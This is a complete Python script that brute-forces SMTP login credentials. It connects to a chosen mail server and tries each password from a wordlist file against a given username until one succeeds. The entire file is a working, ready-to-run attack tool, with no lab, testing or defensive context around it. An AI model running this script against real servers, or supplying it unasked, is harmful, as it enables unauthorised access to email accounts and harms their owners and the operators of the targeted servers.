import smtplib
import argparse
from time import sleep

def brute_force_smtp(target, username, wordlist):
    """
    Function to perform brute force attack on SMTP server with provided username and password wordlist
    Args:
    - target: SMTP server address (e.g., 'smtp.example.com')
    - username: the username to use in the brute-force attempt
    - wordlist: list of potential passwords to try
    """
    try:
        # Establish connection to the SMTP server
        server = smtplib.SMTP(target, 25)
        server.set_debuglevel(0)
        print(f"Attempting to brute force on {target} with username {username}")
        
        for password in wordlist:
            try:
                server.login(username, password)
                print(f"Success: Found password '{password}'")
                break
            except smtplib.SMTPAuthenticationError:
                print(f"Failed: {password}")
                sleep(1)  # Delay to prevent rapid-fire requests
            except Exception as e:
                print(f"Error occurred: {e}")
                break
        
        server.quit()
    except Exception as e:
        print(f"Error connecting to server: {e}")

def main():
    # Setup argument parser
    parser = argparse.ArgumentParser(description="SMTP Brute Forcer")
    parser.add_argument("target", help="SMTP server address (e.g., smtp.example.com)")
    parser.add_argument("username", help="Username to attempt to brute force")
    parser.add_argument("wordlist", help="File containing password wordlist (one password per line)")

    args = parser.parse_args()

    # Read password list from the given wordlist file
    try:
        with open(args.wordlist, 'r') as file:
            passwords = file.readlines()
            passwords = [line.strip() for line in passwords]  # Remove newline characters
    except FileNotFoundError:
        print("Wordlist file not found!")
        return

    # Perform brute force attack
    brute_force_smtp(args.target, args.username, passwords)

if __name__ == "__main__":
    main()
